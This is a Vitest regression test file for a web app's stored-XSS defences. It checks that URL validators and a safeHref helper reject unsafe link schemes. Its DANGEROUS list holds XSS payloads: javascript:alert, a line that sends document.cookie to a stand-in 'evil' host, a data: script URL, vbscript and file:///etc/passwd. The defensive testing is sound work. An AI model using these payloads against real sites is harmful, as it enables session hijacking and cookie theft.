// @vitest-environment jsdom
/**
 * Stored-XSS regression gate (2026-08-24).
 *
 * `z.string().url()` delegates to `new URL()`, which accepts `javascript:` and
 * `data:`. The public wishlist page renders an item's `external_url` straight
 * into an anchor labelled "View item →", so a value that passed validation
 * would have executed in a visitor's session on click.
 *
 * These tests assert the CLOSED side — that the unsafe schemes are refused —
 * because that is the direction a regression travels. A test that only checks
 * https:// still passes after someone swaps webUrl() back for z.string().url().
 */

import { webUrl } from '@/lib/validation/base';
import { wishlistItemSchema } from '@/lib/validation/wishlist';
import { userServiceSchema } from '@/lib/validation/commerce';
import { safeHref, safeHrefs, hrefLabel } from '@/lib/security/safeHref';

const DANGEROUS = [
  'javascript:alert(1)',
  'JavaScript:alert(1)',
  'JAVASCRIPT:fetch("//evil?c="+document.cookie)',
  'data:text/html,<script>alert(1)</script>',
  'vbscript:msgbox(1)',
  'file:///etc/passwd',
];

const SAFE = ['https://orangecat.ch', 'http://example.com/a/b?c=d', 'HTTPS://ORANGECAT.CH'];

describe('webUrl() — scheme is part of validity', () => {
  it.each(DANGEROUS)('rejects %s', url => {
    expect(webUrl().safeParse(url).success).toBe(false);
  });

  it.each(SAFE)('accepts %s', url => {
    expect(webUrl().safeParse(url).success).toBe(true);
  });

  it('still rejects strings that are not URLs at all', () => {
    expect(webUrl().safeParse('not a url').success).toBe(false);
  });

  it('trims, so a padded dangerous scheme cannot sneak past the prefix check', () => {
    expect(webUrl().safeParse('  \n javascript:alert(1)').success).toBe(false);
  });

  it('stores the trimmed value', () => {
    const result = webUrl().safeParse('  https://orangecat.ch  ');
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data).toBe('https://orangecat.ch');
    }
  });

  it('honours a max length', () => {
    expect(webUrl({ max: 20 }).safeParse('https://a.ch').success).toBe(true);
    expect(webUrl({ max: 20 }).safeParse(`https://a.ch/${'x'.repeat(50)}`).success).toBe(false);
  });
});

describe('wishlist external_url — the field that reaches a public href', () => {
  const base = { title: 'Nice gift', target_amount_btc: 0.001 };

  it.each(DANGEROUS)('refuses to store %s', url => {
    const result = wishlistItemSchema.safeParse({ ...base, external_url: url });
    expect(result.success).toBe(false);
    // Assert the failure is about external_url specifically — a missing
    // required field would otherwise make this test pass for the wrong reason.
    if (!result.success) {
      expect(result.error.issues.some(i => i.path.includes('external_url'))).toBe(true);
    }
  });

  it('accepts an ordinary product link', () => {
    expect(
      wishlistItemSchema.safeParse({ ...base, external_url: 'https://example.com/item' }).success
    ).toBe(true);
  });
});

describe('service portfolio_links', () => {
  const base = { title: 'Web development', category: 'Development', hourly_rate: 100 };

  it('rejects a dangerous URL anywhere in the array', () => {
    const result = userServiceSchema.safeParse({
      ...base,
      portfolio_links: ['https://orangecat.ch', 'javascript:alert(1)'],
    });
    expect(result.success).toBe(false);
  });

  it('accepts a list of http(s) links', () => {
    expect(
      userServiceSchema.safeParse({
        ...base,
        portfolio_links: ['https://orangecat.ch', 'https://loki.orangecat.ch'],
      }).success
    ).toBe(true);
  });
});

describe('safeHref() — the render-side half', () => {
  it.each(DANGEROUS)('returns null for %s', url => {
    expect(safeHref(url)).toBeNull();
  });

  it('returns the url for http(s)', () => {
    expect(safeHref('https://orangecat.ch')).toBe('https://orangecat.ch');
  });

  it('is not fooled by leading whitespace or control characters', () => {
    // Browsers strip these before parsing the scheme, so the guard must too.
    expect(safeHref('  javascript:alert(1)')).toBeNull();
    expect(safeHref('\n\tjavascript:alert(1)')).toBeNull();
  });

  it('handles non-string input without throwing', () => {
    expect(safeHref(null)).toBeNull();
    expect(safeHref(undefined)).toBeNull();
    expect(safeHref(42)).toBeNull();
  });

  it('filters a mixed list down to the safe entries', () => {
    expect(safeHrefs(['https://a.ch', 'javascript:alert(1)', 'http://b.ch'])).toEqual([
      'https://a.ch',
      'http://b.ch',
    ]);
    expect(safeHrefs(null)).toEqual([]);
  });

  it('labels a link by host, without www', () => {
    expect(hrefLabel('https://www.orangecat.ch/services/1')).toBe('orangecat.ch');
  });
});
